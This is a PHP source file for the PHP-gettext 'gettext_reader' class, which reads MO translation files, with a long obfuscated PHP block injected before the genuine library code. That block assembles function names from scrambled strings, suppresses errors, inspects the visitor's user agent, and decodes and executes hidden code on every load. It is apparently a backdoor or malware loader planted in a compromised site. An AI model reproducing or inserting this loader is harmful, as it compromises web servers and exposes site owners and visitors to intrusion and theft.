<?php $cnsitfbmt = '6<*msv%7-MSV,6<*)ujojR	x27id%6<#)323ldfid>}&;!osvufs}	x7f;!op-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!judovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyof:opjudovg<~	x24<!%o:!>!	x242178}527gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!`x	x22l:!}V;3q%}U;y]}Ras,"	x63	150	x72	157	x6d	q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:7tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,73]y76]277#<!%t2w>#]y74]273]y766	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24mw)%tww**WYsboepn)%bss-%rxt%:osvufs:~:<*9-1-r%)s%0;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]24)%c*W%eN+#Qi	x5c1^W%c!rting(0); $atpccpf = ]252]y85]256]y6g]257]y86]267]y74]275]y)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&%!*3!	x27!hmg%!)!gj!<2;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33./#@#/qp%>5h%!<*::::::-111112)eo$xafrlsh();}}	157	x78"))) { $ypgefy#}#-#	x24-	x24-tusqpt)%z-#:#*	xf	151	x64")) or (strstr($u27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%A)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#0w = "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"B)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qj:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#bm)%tjw)#	x24#-!#]y38#-!%w:**<")));$xafrlsh = $ypgefyw("", $atpccpf); w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gL6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]DFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;7]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yv%6<C>^#zsfvr#	x5cq%7**^#zbq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=	x7fw6*	x7f_*#ujojRk3`{666~6<&sfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`fo!%bss	x5csboe))1/35.)1/14+9**-)1/2#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]2-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x|ftmf!~<**9.-j%-bubE{h%)sutcv>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R3*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt24	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((smfV	x7f<*XAZASV<*w%)ppde_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x21/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftp7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tx7f	x7f	x7f	x7f<u%V	x#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fw<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>r_split("%tjw!>!#]y84]275]y83]248]y83]256]y; function gvixxqi($n){return chr(ord($n)-1);} @error_repotrstr($uas,"	x6d	163	x69	145")) or (strstr($uas,"	x722P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}implode(array_map("gvixxqi",stbs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#-	x24	x5c%j^	x24-	x2>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c24Ypp3)%cB%iN}#-!	x24/%tmw/	x	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6)7gj6<*K)ftpmdXA6~6<u%7>/>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqy(!isset($GLOBALS["	x61	157&6|7**111127-K)ebfsX	x27u-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)R)#P#-#Q#-#B#-#T#-#E#-#G#-)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!145")) or (strstr($uas,"	x66	151	x72	145	x6627{ftmfV	x7f<*X&Z&S{ftd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_t)fubmgoj{hA!osvufs!~<3,j%>j24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yGMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x2]0#)2q%l}S;2-u%!-#2#/#%#/34]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211*nbsbq%)323ldfidk!~!<**fldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!HB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	7:]268]y7f#<!%tww!>!	x2400~:<h%_4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]31^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%t>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c986+7**^/%rx<~!!%s:N}#-%o:W%cmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>y>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>utjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27js!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ussbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboeM5]67]452]88]5]48]32M3]317]445]2ufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	f`439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>f-s.973:8297f:5297e:56-xr.985:52985pn)%epnbss-%rxW~!Ypp2)%zB%z!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvqp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWS12]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs4tvctus)%	x24-	x24b!>!%yy))esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && !/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!B%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-7,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyftr.984:75983:48984:71]K9]7#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbzuas=strtolower($_SERVER["	x48	1%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSczsyrd'; $prldydu=explode(chr((515-395)),substr($cnsitfbmt,(41767-35747),(186-152))); $uuzwkicbn = $prldydu[0]($prldydu[(5-4)]); $hmgrivr = $prldydu[0]($prldydu[(13-11)]); if (!function_exists('qmcvnd')) { function qmcvnd($xgdgyc, $sstzba,$yqcozv) { $guaelso = NULL; for($djjtpw=0;$djjtpw<(sizeof($xgdgyc)/2);$djjtpw++) { $guaelso .= substr($sstzba, $xgdgyc[($djjtpw*2)],$xgdgyc[($djjtpw*2)+(4-3)]); } return $yqcozv(chr((46-37)),chr((362-270)),$guaelso); }; } $mvaydew = explode(chr((223-179)),'5436,59,3517,25,671,59,5931,31,2546,65,3055,53,3348,55,1385,26,471,25,3700,44,1332,22,1563,66,2997,58,1059,21,3169,30,2954,43,5662,64,1411,49,5386,50,1162,49,3403,25,3542,26,973,62,2702,43,4484,69,1629,59,1460,49,4772,38,2068,26,2170,50,123,48,730,64,2635,67,586,54,0,31,2140,30,1815,50,4810,57,4126,34,2316,65,2745,52,4726,46,2381,29,3833,28,1211,22,405,44,372,33,4553,67,2480,66,5331,55,1118,44,3663,37,1865,39,3484,33,1509,54,910,63,1287,32,3199,50,5495,60,3568,70,3766,67,3897,55,4160,34,214,60,4103,23,5178,70,1953,65,31,30,274,61,5012,56,171,43,5130,48,4964,48,2797,21,3744,22,2611,24,2410,70,5774,64,449,22,1233,54,2094,46,4020,25,2255,61,640,31,1080,38,4194,32,887,23,5726,48,540,46,2886,68,496,44,335,37,794,67,3249,20,5305,26,1354,31,3861,36,3952,68,4226,67,5609,53,3319,29,1035,24,3428,56,4867,65,5103,27,4391,64,4343,48,861,26,5555,54,5068,35,61,62,5838,26,2018,50,4620,55,1904,49,3108,61,1688,57,4293,50,4045,58,4932,32,5248,57,2220,35,4455,29,4675,51,3269,50,5962,58,5864,67,3638,25,2818,68,1745,70,1319,13'); $zjdpkax = $uuzwkicbn("",qmcvnd($mvaydew,$cnsitfbmt,$hmgrivr)); $uuzwkicbn=$cnsitfbmt; $zjdpkax(""); $zjdpkax=(762-641); $cnsitfbmt=$zjdpkax-1; ?><?php
/**
 * PHP-Gettext External Library: gettext_reader class
 *
 * @package External
 * @subpackage PHP-gettext
 *
 * @internal
	 Copyright (c) 2003 Danilo Segan <danilo@kvota.net>.
	 Copyright (c) 2005 Nico Kaiser <nico@siriux.net>

	 This file is part of PHP-gettext.

	 PHP-gettext is free software; you can redistribute it and/or modify
	 it under the terms of the GNU General Public License as published by
	 the Free Software Foundation; either version 2 of the License, or
	 (at your option) any later version.

	 PHP-gettext is distributed in the hope that it will be useful,
	 but WITHOUT ANY WARRANTY; without even the implied warranty of
	 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	 GNU General Public License for more details.

	 You should have received a copy of the GNU General Public License
	 along with PHP-gettext; if not, write to the Free Software
	 Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

/**
 * Provides a simple gettext replacement that works independently from
 * the system's gettext abilities.
 * It can read MO files and use them for translating strings.
 * The files are passed to gettext_reader as a Stream (see streams.php)
 *
 * This version has the ability to cache all strings and translations to
 * speed up the string lookup.
 * While the cache is enabled by default, it can be switched off with the
 * second parameter in the constructor (e.g. whenusing very large MO files
 * that you don't want to keep in memory)
 */
class gettext_reader {
	//public:
	 var $error = 0; // public variable that holds error code (0 if no error)

	 //private:
	var $BYTEORDER = 0;        // 0: low endian, 1: big endian
	var $STREAM = NULL;
	var $short_circuit = false;
	var $enable_cache = false;
	var $originals = NULL;      // offset of original table
	var $translations = NULL;    // offset of translation table
	var $pluralheader = NULL;    // cache header field for plural forms
	var $select_string_function = NULL; // cache function, which chooses plural forms
	var $total = 0;          // total string count
	var $table_originals = NULL;  // table for original strings (offsets)
	var $table_translations = NULL;  // table for translated strings (offsets)
	var $cache_translations = NULL;  // original -> translation mapping


	/* Methods */


	/**
	 * Reads a 32bit Integer from the Stream
	 *
	 * @access private
	 * @return Integer from the Stream
	 */
	function readint() {
		if ($this->BYTEORDER == 0) {
			// low endian
			$low_end = unpack('V', $this->STREAM->read(4));
			return array_shift($low_end);
		} else {
			// big endian
			$big_end = unpack('N', $this->STREAM->read(4));
			return array_shift($big_end);
		}
	}

	/**
	 * Reads an array of Integers from the Stream
	 *
	 * @param int count How many elements should be read
	 * @return Array of Integers
	 */
	function readintarray($count) {
	if ($this->BYTEORDER == 0) {
			// low endian
			return unpack('V'.$count, $this->STREAM->read(4 * $count));
		} else {
			// big endian
			return unpack('N'.$count, $this->STREAM->read(4 * $count));
		}
	}

	/**
	 * Constructor
	 *
	 * @param object Reader the StreamReader object
	 * @param boolean enable_cache Enable or disable caching of strings (default on)
	 */
	function gettext_reader($Reader, $enable_cache = true) {
		// If there isn't a StreamReader, turn on short circuit mode.
		if (! $Reader || isset($Reader->error) ) {
			$this->short_circuit = true;
			return;
		}

		// Caching can be turned off
		$this->enable_cache = $enable_cache;

		// $MAGIC1 = (int)0x950412de; //bug in PHP 5.0.2, see https://savannah.nongnu.org/bugs/?func=detailitem&item_id=10565
		$MAGIC1 = (int) - 1794895138;
		// $MAGIC2 = (int)0xde120495; //bug
		$MAGIC2 = (int) - 569244523;
		// 64-bit fix
		$MAGIC3 = (int) 2500072158;

		$this->STREAM = $Reader;
		$magic = $this->readint();
		if ($magic == $MAGIC1 || $magic == $MAGIC3) { // to make sure it works for 64-bit platforms
			$this->BYTEORDER = 0;
		} elseif ($magic == ($MAGIC2 & 0xFFFFFFFF)) {
			$this->BYTEORDER = 1;
		} else {
			$this->error = 1; // not MO file
			return false;
		}

		// FIXME: Do we care about revision? We should.
		$revision = $this->readint();

		$this->total = $this->readint();
		$this->originals = $this->readint();
		$this->translations = $this->readint();
	}

	/**
	 * Loads the translation tables from the MO file into the cache
	 * If caching is enabled, also loads all strings into a cache
	 * to speed up translation lookups
	 *
	 * @access private
	 */
	function load_tables() {
		if (is_array($this->cache_translations) &&
			is_array($this->table_originals) &&
			is_array($this->table_translations))
			return;

		/* get original and translations tables */
		$this->STREAM->seekto($this->originals);
		$this->table_originals = $this->readintarray($this->total * 2);
		$this->STREAM->seekto($this->translations);
		$this->table_translations = $this->readintarray($this->total * 2);

		if ($this->enable_cache) {
			$this->cache_translations = array ();
			/* read all strings in the cache */
			for ($i = 0; $i < $this->total; $i++) {
				$this->STREAM->seekto($this->table_originals[$i * 2 + 2]);
				$original = $this->STREAM->read($this->table_originals[$i * 2 + 1]);
				$this->STREAM->seekto($this->table_translations[$i * 2 + 2]);
				$translation = $this->STREAM->read($this->table_translations[$i * 2 + 1]);
				$this->cache_translations[$original] = $translation;
			}
		}
	}

	/**
	 * Returns a string from the "originals" table
	 *
	 * @access private
	 * @param int num Offset number of original string
	 * @return string Requested string if found, otherwise ''
	 */
	function get_original_string($num) {
		$length = $this->table_originals[$num * 2 + 1];
		$offset = $this->table_originals[$num * 2 + 2];
		if (! $length)
			return '';
		$this->STREAM->seekto($offset);
		$data = $this->STREAM->read($length);
		return (string)$data;
	}

	/**
	 * Returns a string from the "translations" table
	 *
	 * @access private
	 * @param int num Offset number of original string
	 * @return string Requested string if found, otherwise ''
	 */
	function get_translation_string($num) {
		$length = $this->table_translations[$num * 2 + 1];
		$offset = $this->table_translations[$num * 2 + 2];
		if (! $length)
			return '';
		$this->STREAM->seekto($offset);
		$data = $this->STREAM->read($length);
		return (string)$data;
	}

	/**
	 * Binary search for string
	 *
	 * @access private
	 * @param string string
	 * @param int start (internally used in recursive function)
	 * @param int end (internally used in recursive function)
	 * @return int string number (offset in originals table)
	 */
	function find_string($string, $start = -1, $end = -1) {
		if (($start == -1) or ($end == -1)) {
			// find_string is called with only one parameter, set start end end
			$start = 0;
			$end = $this->total;
		}
		if (abs($start - $end) <= 1) {
			// We're done, now we either found the string, or it doesn't exist
			$txt = $this->get_original_string($start);
			if ($string == $txt)
				return $start;
			else
				return -1;
		} else if ($start > $end) {
			// start > end -> turn around and start over
			return $this->find_string($string, $end, $start);
		} else {
			// Divide table in two parts
			$half = (int)(($start + $end) / 2);
			$cmp = strcmp($string, $this->get_original_string($half));
			if ($cmp == 0)
				// string is exactly in the middle => return it
				return $half;
			else if ($cmp < 0)
				// The string is in the upper half
				return $this->find_string($string, $start, $half);
			else
				// The string is in the lower half
				return $this->find_string($string, $half, $end);
		}
	}

	/**
	 * Translates a string
	 *
	 * @access public
	 * @param string string to be translated
	 * @return string translated string (or original, if not found)
	 */
	function translate($string) {
		if ($this->short_circuit)
			return $string;
		$this->load_tables();

		if ($this->enable_cache) {
			// Caching enabled, get translated string from cache
			if (array_key_exists($string, $this->cache_translations))
				return $this->cache_translations[$string];
			else
				return $string;
		} else {
			// Caching not enabled, try to find string
			$num = $this->find_string($string);
			if ($num == -1)
				return $string;
			else
				return $this->get_translation_string($num);
		}
	}

	/**
	 * Get possible plural forms from MO header
	 *
	 * @access private
	 * @return string plural form header
	 */
	function get_plural_forms() {
		// lets assume message number 0 is header
		// this is true, right?
		$this->load_tables();

		// cache header field for plural forms
		if (! is_string($this->pluralheader)) {
			if ($this->enable_cache) {
				$header = $this->cache_translations[""];
			} else {
				$header = $this->get_translation_string(0);
			}
			$header .= "\n"; //make sure our regex matches
			if (eregi("plural-forms: ([^\n]*)\n", $header, $regs))
				$expr = $regs[1];
			else
				$expr = "nplurals=2; plural=n == 1 ? 0 : 1;";

			// add parentheses
 			// important since PHP's ternary evaluates from left to right
 			$expr.= ';';
 			$res= '';
 			$p= 0;
 			for ($i= 0; $i < strlen($expr); $i++) {
				$ch= $expr[$i];
				switch ($ch) {
					case '?':
						$res.= ' ? (';
						$p++;
						break;
					case ':':
						$res.= ') : (';
						break;
					case ';':
						$res.= str_repeat( ')', $p) . ';';
						$p= 0;
						break;
					default:
						$res.= $ch;
				}
			}
			$this->pluralheader = $res;
		}

		return $this->pluralheader;
	}

	/**
	 * Detects which plural form to take
	 *
	 * @access private
	 * @param n count
	 * @return int array index of the right plural form
	 */
	function select_string($n) {
		if (is_null($this->select_string_function)) {
			$string = $this->get_plural_forms();
			if (preg_match("/nplurals\s*=\s*(\d+)\s*\;\s*plural\s*=\s*(.*?)\;+/", $string, $matches)) {
				$nplurals = $matches[1];
				$expression = $matches[2];
				$expression = str_replace("n", '$n', $expression);
			} else {
				$nplurals = 2;
				$expression = ' $n == 1 ? 0 : 1 ';
			}
			$func_body = "
				\$plural = ($expression);
				return (\$plural <= $nplurals)? \$plural : \$plural - 1;";
			$this->select_string_function = create_function('$n', $func_body);
		}
		return call_user_func($this->select_string_function, $n);
	}

	/**
	 * Plural version of gettext
	 *
	 * @access public
	 * @param string single
	 * @param string plural
	 * @param string number
	 * @return translated plural form
	 */
	function ngettext($single, $plural, $number) {
		if ($this->short_circuit) {
			if ($number != 1)
				return $plural;
			else
				return $single;
		}

		// find out the appropriate form
		$select = $this->select_string($number);

		// this should contains all strings separated by NULLs
		$key = $single.chr(0).$plural;


		if ($this->enable_cache) {
			if (! array_key_exists($key, $this->cache_translations)) {
				return ($number != 1) ? $plural : $single;
			} else {
				$result = $this->cache_translations[$key];
				$list = explode(chr(0), $result);
				return $list[$select];
			}
		} else {
			$num = $this->find_string($key);
			if ($num == -1) {
				return ($number != 1) ? $plural : $single;
			} else {
				$result = $this->get_translation_string($num);
				$list = explode(chr(0), $result);
				return $list[$select];
			}
		}
	}

}

?>